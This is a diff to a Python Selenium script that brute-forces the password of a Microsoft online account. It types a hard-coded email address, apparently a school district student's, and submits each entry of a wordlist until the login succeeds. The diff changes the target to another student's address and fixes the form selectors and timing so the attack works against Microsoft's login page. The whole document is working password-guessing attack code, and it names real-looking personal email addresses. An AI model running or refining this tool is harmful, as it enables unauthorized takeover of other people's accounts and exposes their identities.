@@ -7,8 +7,8 @@ import time
 x = ""
 #This checks to see if you already got a list to avoid making a whole new list which takes forever
 print("Do you have list already? Y/N")
-x = input();
-if x == "N" or "n":
+x = input()
+if x == "N" or x == "n":
   #Grabs input to see how big the string or password has to be and limits the scopes
   min_len = int(input("Enter minimn length of password: "))
   max_len = int(input("Enter maxium length of password: "))
@@ -32,28 +32,27 @@ driver.get('https://login.microsoftonline.com/common/oauth2/authorize?client_id=
 time.sleep(30)
 email_field = driver.find_element(By.XPATH, '//*[@id="i0116"]')
 # Input your email address and press Enter to proceed to the next page
-email_field.send_keys('24khale@go.dsdmail.net')
+email_field.send_keys('23achumakov@go.dsdmail.net')
 next_buttonTwo = driver.find_element(By.XPATH, '//*[@id="idSIButton9"]')
 next_buttonTwo.click()
 # Define the path to your wordlist file
 wordlist_path = 'Wordlist.txt'
 # Open the wordlist file and try each password
-time.sleep(30)
+time.sleep(5)
 with open(wordlist_path, 'r') as f:
     for line in f:
         # Strip any newline characters from the word
         password = line.strip()
         # Find the password field and input the password
-        password_field = driver.find_element(By.XPATH, '//*[@id="password"]/div[1]/div/div[1]/input')
+        password_field = driver.find_element(By.XPATH, '//*[@id="i0118"]')
         password_field.send_keys(password)
         # Click the "Next" button to log in
-        next_button = driver.find_element(By.XPATH, "//button[@class='VfPpkd-LgbsSe']")
+        next_button = driver.find_element(By.XPATH, '//*[@id="idSIButton9"]')
         next_button.click()
+        time.sleep(5)
         # Check if login was successful
-        if "Enter a password" not in driver.page_source:
+        if "Enter password" not in driver.page_source:
             print("Correct password is:", password)
             break
-        # Clear the password field and try the next password
-        password_field.clear()
 # Close the browser
 driver.quit()
